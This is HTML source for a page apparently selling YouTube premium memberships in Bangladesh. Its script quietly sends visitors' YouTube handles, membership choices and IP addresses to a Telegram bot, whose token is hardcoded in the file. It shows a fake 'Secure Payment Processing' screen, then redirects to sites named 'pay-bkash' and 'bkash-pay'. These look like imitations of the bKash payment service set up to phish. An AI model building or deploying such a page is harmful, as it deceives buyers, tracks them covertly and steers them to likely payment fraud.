<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LUXURY YT</title>
    <style>
        /* Styling for page elements as before */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #3c0068;
            color: white;
            text-align: center;
            padding: 20px;
        }

        .header {
            padding: 20px;
        }

        .logo img {
            width: 200px;
            height: auto;
        }

        h1 {
            font-size: 2.5rem;
            margin: 10px 0;
        }

        .offer p {
            font-size: 1.2rem;
            margin: 20px 0;
        }

        .offer h2 {
            font-size: 2rem;
            margin: 30px 0;
            font-weight: bold;
        }

        .pricing table {
            width: 100%;
            margin: 20px 0;
            border-collapse: collapse;
        }

        .pricing th, td {
            border: 1px solid white;
            padding: 15px;
            font-size: 1.2rem;
        }

        .buy-now button {
            background-color: #ff4d4d;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 20px;
        }

        .buy-now button:hover {
            background-color: #ff3333;
        }

        .footer {
            margin-top: 50px;
            padding: 20px;
        }

        .payment img {
            width: 80px;
            margin-top: 10px;
        }

        .social a {
            margin: 10px;
            display: inline-block;
        }

        .social img {
            width: 30px;
            height: 30px;
        }

        /* Popup styling */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            z-index: 1000;
            color: black;
        }

        .popup input, .popup select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        .popup button {
            padding: 10px 20px;
            background-color: #ff4d4d;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .popup button:hover {
            background-color: #ff3333;
        }

        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 500;
        }

        /* Processing Animation Styling */
        #processingAnimation {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            z-index: 2000;
            text-align: center;
            font-family: 'Roboto', sans-serif;
        }

        #processingAnimation img {
            width: 50px;
            margin-bottom: 10px;
        }

        #processingAnimation p {
            font-size: 1.2rem;
            font-weight: 500;
        }

        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">
            <img src="https://imgur.com/vNgYpqJ.png" alt="YoutSubscriber Logo">
        </div>
        <h1>LUXURY MEMBERSHIP</h1>
        <p> PURCHASE PREMIUM MEMBERSHIP FOR YOUTUBE FROM US IN BD</p>
    </header>

    <!-- Processing Animation Popup -->
    <div id="processingAnimation">
        <div class="loader"></div>
        <img src="https://img.icons8.com/ios-filled/50/000000/lock--v1.png" alt="Lock Icon">
        <p>Secure Payment Processing...</p>
    </div>

    <!-- Other content remains unchanged -->

    <!-- Popup HTML -->
    <div class="overlay"></div>
    <div class="popup" id="popup">
        <h5>AUTHENTICATION</h5>
        <input type="text" id="youtubeHandle" placeholder="Enter YouTube Handle">
        <input type="text" id="activationCode" placeholder="Enter Activation Code">
        <select id="membershipType">
            <option value="gold">Gold Membership</option>
            <option value="platinum">Platinum Membership</option>
        </select>
        <button onclick="activate()">Activate</button>
    </div>

    <script>
        function openPopup() {
            document.querySelector('.overlay').style.display = 'block';
            document.getElementById('popup').style.display = 'block';
        }

        function closePopup() {
            document.querySelector('.overlay').style.display = 'none';
            document.getElementById('popup').style.display = 'none';
        }

        function sendTelegramMessage(message) {
            const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
            const chatId = '7174617845';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Using XMLHttpRequest to avoid potential CORS issues
            var xhttp = new XMLHttpRequest();
            xhttp.open("GET", url, true);
            xhttp.send();
        }

        function getIPAndSendMessage(message) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipMessage = `${message} IP Address: ${data.ip}`;
                    sendTelegramMessage(ipMessage);
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                    sendTelegramMessage(message); // Send without IP in case of failure
                });
        }

        function showProcessingAnimation() {
            document.getElementById('processingAnimation').style.display = 'block';
        }

        function hideProcessingAnimation() {
            document.getElementById('processingAnimation').style.display = 'none';
        }

        function activate() {
            const youtubeHandle = document.getElementById('youtubeHandle').value;
            const activationCode = document.getElementById('activationCode').value;
            const membershipType = document.getElementById('membershipType').value;

            if (activationCode === 'LYT089') {
                // Show the processing animation
                showProcessingAnimation();

                // Send activation message to Telegram
                getIPAndSendMessage(`YouTube Handle: ${youtubeHandle} has activated their subscription. Membership: ${membershipType}`);

                // Simulate a 5-second delay for the animation
                setTimeout(() => {
                    // Hide the processing animation after 5 seconds
                    hideProcessingAnimation();

                    // Redirect based on membership type
                    if (membershipType === 'gold') {
                        window.location.href = 'https://pay-bkash.vercel.app';
                    } else if (membershipType === 'platinum') {
                        window.location.href = 'https://bkash-pay.vercel.app';
                    }
                }, 5000);
            } else {
                alert('Invalid activation code!');
            }
        }

        function buyNow() {
            const message = "Someone clicked on 'Buy Now'.";
            getIPAndSendMessage(message);

            openPopup();
        }
    </script>
</body>
</html>
